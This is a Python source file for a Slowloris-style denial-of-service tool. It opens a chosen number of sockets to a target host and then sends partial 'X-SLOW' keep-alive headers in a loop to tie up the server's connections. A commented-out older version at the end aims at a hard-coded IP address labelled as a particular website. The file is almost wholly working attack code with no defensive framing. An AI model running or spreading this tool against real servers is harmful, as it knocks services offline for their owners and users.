import argparse
import logging
import random
import socket
import ssl
import sys
import time
from time import sleep

import click

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import IP, TCP, conf, send


def init_socket(host, port, https=False):

    ua = "Mozilla/5.0"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.settimeout(4)

    #if ssl:
    #    s = ssl.wrap_socket(s)

    s.connect((host, port))

    #s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
    #s.send("User-Agent: {}\r\n".format(ua).encode())
    #s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
    time.sleep(1)

    return s


@click.command()
@click.argument('host')
@click.option('-c', 'count', default=100, help='How many sockets (default: 100)')
@click.option('-p', 'port', default=80, help='Port to use (default: 80)')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
@click.option('--https', is_flag=True, default=False, help='Use SSL/TLS (default: No)')
def cmd_slowloris(host, count, port, https, verbose):

    list_of_sockets = []

    socket_count = count
    print("Attacking %s with %s sockets." %(host, socket_count))
    print("Creating sockets...")

    for num in range(count):
        try:
            print("Creating socket %s" % num)
            s = init_socket(host, port, https)
            list_of_sockets.append(s)
        except socket.error:
            print("SOCKET ERROROOOROROR")
            break

    while True:
        print("Sending keep-alive headers... Socket count: %s" %(len(list_of_sockets)))
        for s in list_of_sockets:
            try:
                s.send("X-SLOW: 5\r\n".encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count - len(list_of_sockets)):
            print("Recreating socket...")
            try:
                s = init_socket(host, port, https)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                print("SOCKET ERROROOOROROR")
                break

        time.sleep(1)


if __name__ == '__main__':
    cmd_slowloris()

'''
import socket
from time import sleep

count = 50

socks = {}

for n in range(count):
    socks[n] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socks[n].connect(("45.77.113.133", 80)) # www.portantier.com
    socks[n].send("GET / HTTP/1.0\r\n".encode())
    socks[n].setblocking(False)


while True:
    for n in socks.keys():
        socks[n].send("X-SLOW: {}\n\n".format(n, n).encode())
        if socks[n].recv(1024):
            del socks[n]
        sleep(2)

#for num in range(count):
#    socklist[num].send("X-LAST: 1\r\n\r\n".encode())
'''
